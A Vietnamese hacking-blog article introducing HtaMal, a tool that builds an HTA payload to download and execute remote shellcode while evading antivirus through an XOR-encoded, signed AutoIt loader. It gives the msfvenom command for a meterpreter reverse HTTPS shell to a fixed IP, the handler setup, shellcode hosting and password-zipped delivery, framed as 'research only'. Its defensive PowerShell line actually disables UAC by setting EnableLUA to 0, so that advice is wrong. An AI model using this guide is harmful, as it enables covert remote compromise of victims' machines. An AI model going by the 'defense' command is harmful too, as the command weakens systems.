# Htamal: kỹ thuật thực thi shellcode từ xa vượt qua phát hiện của Antivirus

Tác giả: Hevin  
Chuyên mục: Basic Hacking  
Ngày đăng: 10/02/2025

Việc thực thi mã độc mà không bị phát hiện bởi các phần mềm diệt virus (Antivirus) là một thách thức không nhỏ đối với cả bên tấn công lẫn phòng thủ. Hôm nay, chúng ta sẽ khám phá một công cụ mang tên **HtaMal**, một phương pháp sáng tạo cho phép thực thi **shellcode từ xa** trong môi trường Windows, đồng thời **vượt qua các cơ chế phát hiện của Antivirus** một cách hiệu quả. Kỹ thuật này lợi dụng **HTA (HTML Application) và JavaScript**, cho phép kẻ tấn công tải và thực thi shellcode trực tiếp từ xa, từ đó giảm thiểu khả năng bị phát hiện.

**_Lưu ý: Bài viết này chỉ dành cho mục đích nghiên cứu, học tập. Anonyviet sẽ không chịu bất cứ mọi hành vi bất hợp pháp nào !_**

## **Khái niệm ngắn gọn về HTA và phương thức tấn công**

### **HTA là gì?**

HTA (HTML Application) là một loại ứng dụng dựa trên HTML do Microsoft phát triển, có thể thực thi trực tiếp thông qua **mshta.exe** mà không bị hạn chế bởi sandbox của trình duyệt. Chính vì thế HTA trở thành một công cụ hữu ích cho các tác vụ tự động hóa hợp pháp, nhưng cũng là một công cụ lợi hại trong tay hacker

### **Tại sao HTA có thể bị lạm dụng?**

- **Chạy với quyền cao**: HTA có thể thực thi **VBScript/JavaScript** với quyền của người dùng mà không cần hiển thị cửa sổ cảnh báo như khi chạy script thông thường
- **Không cần ghi file**: Hacker có thể tải HTA từ xa mà không cần lưu trữ nội dung độc hại trên máy nạn nhân
- **Bỏ qua một số giải pháp bảo mật**: Một số phần mềm Antivirus không quét HTA kỹ như các file thực thi khác (.exe, .dll), tạo ra cơ hội bypass

## **Cách thức hoạt động của payload HtaMal**

HtaMal là một công cụ tạo ra 1 payload **HTA để thực thi shellcode từ xa**, giúp tránh bị phát hiện bởi Antivirus. Quy trình tổng quát như sau:

**Tạo file HTA chứa mã JavaScript độc hại**

- Trong source code của tool mình đã xáo trộn payload ở trang https://obfuscator.io/, bạn có thể xem các source code của payload ở phần cuối trong source tool
- Payload của HtaMal sẽ chuyển tên file, url và lệnh thực thi sang hex và 2 tệp: **autoit.exe và loader.a3x** được mã hóa bằng thuật toán XOR. Khi payload thực thi trên máy nạn nhân, nó sẽ tự giải mã và thực thi lệnh trong thư mục %appdata%

**Tải shellcode từ máy chủ C2:** Khi người dùng mở file HTA, script **loader.a3x** sẽ lấy shellcode từ server của hacker

**Lợi dụng chữ ký số (Digital Signature) hợp lệ của file autoit.exe để bypass Antivirus**

- Mình đã compile script loader.au3 sang loader.a3x, khi chạy lệnh **autoit.exe loader.a3x <hex_url_shellcode>** thực hiện **tải xuống và thực thi shellcode từ xa**, bằng cách sử dụng các hàm Windows API để cấp phát bộ nhớ, sao chép shellcode vào vùng nhớ đã cấp phát, sau đó tạo một luồng mới để thực thi shellcode.
- Một trong những kỹ thuật **Bypass Antivirus (AV)** phổ biến là **lợi dụng chữ ký số hợp lệ của phần mềm hợp pháp** để thực thi mã độc. Trong trường hợp này, mình đã **lợi dụng AutoIt.exe có chữ ký số hợp lệ** để tránh bị phát hiện bởi phần mềm bảo mật

## **HtaMal – Công cụ tạo payload thực thi Shellcode từ xa Bypass Antivirus**

Để sử dụng công cụ này, bạn cần phải tải Python về máy, sau đó tải source code của tool tại đây, sau khi tải xong bạn giải nén ra và trải nghiệm thôi ( Pass giải nén: anonyviet.com )

Trước khi sử dụng HtaMal, chúng ta cần phải tạo ra một shellcode, ở đây mình sẽ sử dụng Metasploit để tạo với câu lệnh:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.1.33 lport=8443 -f raw -o shellcode.bin
```

### Setup môi trường lệnh tấn công

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost=your ip address
set lport=your port
run
```

Tiếp đến, chạy lệnh `python3 -m http.server 80` để mở ra server lưu trữ file **shellcode.bin** và `python3 htamal.py` để chạy tool. Bây giờ mình sẽ nhập url chứa shellcode của mình

Như vậy đã xong, bây giờ mình sẽ nén payload **hta_payload.hta** thành file zip với mật khẩu là 123123@

## **Cách phòng chống tấn công bằng HTA**

Do mshta.exe hiếm khi cần thiết trong môi trường doanh nghiệp, chặn mshta.exe là một cách đơn giản để giảm nguy cơ bị tấn công. Có thể thực hiện bằng cách:

```powershell
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
```

Hoặc trong Group Policy:

- **Computer Configuration → Windows Settings → Security Settings → Software Restriction Policies**
- Thêm **mshta.exe** vào danh sách bị chặn

## **Kết luận**

HtaMal là một công giúp tạo payload thực thi shellcode từ xa, sử dụng các kỹ thuật **bypass Antivirus (AV)** để tránh bị phát hiện. Bằng cách kết hợp **HTA (HTML Application)** với **AutoIt**, công cụ này có thể thực thi mã độc trực tiếp trong bộ nhớ. Tuy nhiên, điều quan trọng cần nhấn mạnh là **HtaMal chỉ được sử dụng cho mục đích nghiên cứu bảo mật và kiểm thử xâm nhập hợp pháp**.

Để phòng chống các kỹ thuật bypass AV như HtaMal, cần phải:

🔹 Giám sát tiến trình đáng ngờ, đặc biệt là AutoIt.exe.

🔹 Hạn chế thực thi HTA trên hệ thống nếu không cần thiết.

🔹 Áp dụng các cơ chế bảo vệ nâng cao như Application Whitelisting, AMSI Logging, và Behavioral Analysis.

---

*Nguồn: AnonyViet - https://anonyviet.com/htamal-ky-thuat-thuc-thi-shellcode/*